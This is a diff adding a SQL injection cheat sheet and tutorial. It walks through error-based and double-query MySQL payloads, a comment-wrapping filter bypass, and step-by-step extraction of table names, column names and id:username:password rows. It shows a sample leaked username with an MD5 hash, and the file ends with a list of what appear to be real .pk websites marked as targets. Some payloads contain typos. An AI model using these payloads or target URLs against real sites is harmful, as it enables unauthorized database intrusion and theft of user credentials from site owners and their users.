@@ -1,0 +1,132 @@
+errorbased:-
+get-
++OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1 --+
+
+post-
+ OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 -- 
+
+
++or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
+
+double query based:-
+get-
++AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),Ox7e))+FROM+INFORMATION_SCHEMA,TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA,TABLES+GROUP+BY+x)a)+AND+1=1
+
+post-
+ AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(VERSION() AS CHAR),Ox7e)) FROM INFORMATION_SCHEMA,TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA,TABLES GROUP BY x)a) AND 1=1
+
+
+get all db's:-
+(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),3
+
+
+
+bypass waf:
+
+http://www.zeetexpro.com.pk/pages.php?id=13 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 --+
+
+
+illegal word= union
+
+/*12345UNION*/
+
+
+
+
+
+
+
+Error based and Double query based SQL Injection
+
+The name basically already spits it out; we will use an error to get the data we want from a certain database / table / column.
+First I will set you off with the queries used, then I will explain how to use, and what response you can get from that.
+
+error based get method:-
+1.	+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1 --+
+2.	+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1
+
+1. 	page.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(version()+as+char),0x7e))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+2.       page.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1—
+3.       +and+(select+count(*)+from+(select+1+union+select+null+union+select+!1)x+group+by+concat((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),floor(rand(0)*2)))—
+4.       page.php?id[]=(@:=1)||@+group+by+concat((select+table_name+from+information_schema.tables+whe?re+table_schema=database()+limit+0,1),0x7e,!@)+having+@||min(@:=0)--
+5.       page.php?id=1+and+(select+1+from+(select+count(*),concat(floor(rand(0)*2),0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1))x+f?rom+information_schema.tables+group+by+x)a)—
+6.       +and+row(1,1)>(select+count(*),concat((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),0x7e,floor(rand(0)*2))x+from+(select+1+uni?on+select+null+union+select+!1)x group+by+x+limit+0,1)—
+7.       +and+(select+*+from+(select+*+from+information_schema.tables+join+information_schema.tables+x)a)—
+
+
+error based post method:- replace '+' in get method queries with space' ' .
+example: OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 -- 
+
+
+double query based
+
+
+get-
++AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),Ox7e))+FROM+INFORMATION_SCHEMA,TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA,TABLES+GROUP+BY+x)a)+AND+1=1
+
+post- replace '+' in get method queries with space' ' .
+example:
+ AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(CAST(VERSION() AS CHAR),Ox7e)) FROM INFORMATION_SCHEMA,TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA,TABLES GROUP BY x)a) AND 1=1
+
+
+
+
+
+
+
+What we are basically doing is using 2 queries within 1 to cause an error to display our webpage, spitting out the info we want.
+
+How it works out:
+www.example.com/page.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(version()+as+char),0x7e))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+In this query we are requesting the version() of the server, now to actually exploit it we will enter:
+
+www.example.com/page.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(table_name+as+char),0x7e))+from+information_schema.tables+where+table_schema=database()+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+
+If you look closely, we are requesting the database name, in error based SQL Injection you will see it spits out the following:
+·         Duplicate entry 'activate~1' for key 'group_key'
+Please note that this is a real example, which means in this case that “activate” is 1 of the current tables, as we perform error based SQL Injection, we have to remove the ~1 sign’s.
+Now to move up the tables to view them all, we would like to see them 1 by 1 we change the LIMIT in the query to 1,1 or higher to 2,1 3,1 etc. till you are out of tables.
+
+www.example.com/page.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(table_name+as+char),0x7e))+from+information_schema.tables+where+table_schema=database()+limit+1,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+Moving the LIMIT up, which we learned earlier in this eBook, will show you the rest of the tables in my example:
+·         Duplicate entry 'banners~1' for key 'group_key'
+Now we want to move along and gather as much info as possible about our target.
+
+Tips & Tricks:
+1.       Websites in different languages use other names to keep their valuable data.
+n  A small list of usernames / passwords that are kept in a other language:
+n  Polish – Username: Nazwa – Password: haslo
+n  Spanish: Username: Usuario(s) Password: contraseña
+n  Dutch: Username: Gebruikersnaam Password: wachtwoord
+This list can be endless but you get the main idea, how to figure out which table / column you have to request info from to get what you want!
+Now that we know which databases there are, in my case its Users with uppercase U (important in MySQL that you keep any seen UPPERCASE or lowercase).
+We want to extract the data. To do this we use the following query:
+www.example.com/.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(column_name+as+char),0x7e))+from+information_schema.columns+where+table_name=0xTABLEHEX+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+As we spoke before about using HEX encoding to get data from the database, we will have to use hex in this query behind the 0x to get the FIRST column from our table, as you can see we will be  working with LIMIT yet again, so you know the drill, hit it up.
+My query used:
+www.example.com/page.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(column_name+as+char),0x7e))+from+information_schema.columns+where+table_name=0x7573657273+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+
+0x7573657273 – That is users in hex encoding, wich gave me the following result:
+n  Duplicate entry 'id~1' for key 'group_key'
+Now we use the LIMIT to go up until we find the column information we want, In my case I found the following columns:
+n  Id
+n  Username
+n  Password
+Now to extract these values we will use the following query:
+www.example.com/page.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(concat(id)+as+char),0x7e))+from+users+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+Now it is important to note that I highlighted the parts you have to edit, in my query it looks like this:
+I know that “ID” is a column in the table users.
+I know that “users” is the database that my target is using, and where I want to get info from.
+And last but not least we use the 0,1 to scoop up the other ids as well.
+Now to get all the info from ID number 1 (probably the admin user), we will use the same query but now with more than only “ID”  in the query like this:
+www.example.com/page.php?id=1+and+(select+1+from+(select+count(*),concat((select(select+concat(cast(concat(id,0x3a,username,0x3a,password)+as+char),0x7e))+from+users+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+Make note that I’m using 0x3a which is hex encoding for the : sign, to keep the query nice and easy to see, the whole query results with this:
+·         Duplicate entry '1:lammertw:0c5dbe3017f2dc6755933adb45735086~1' for key 'group_key'
+Now as I noted before, remove the ~1 and you got all the info like this:
+ID – Username – Password (Encrypted in MD5(Read back if you don’t remember how to decrypt it).
+Well done, now you have mastered a small proportion of Error based MySQL.
+
+
+pk sites:
+http://hotelornate.com.pk/leftmenubody.php?id=56
+http://www.zeetexpro.com.pk/pages.php?id=13
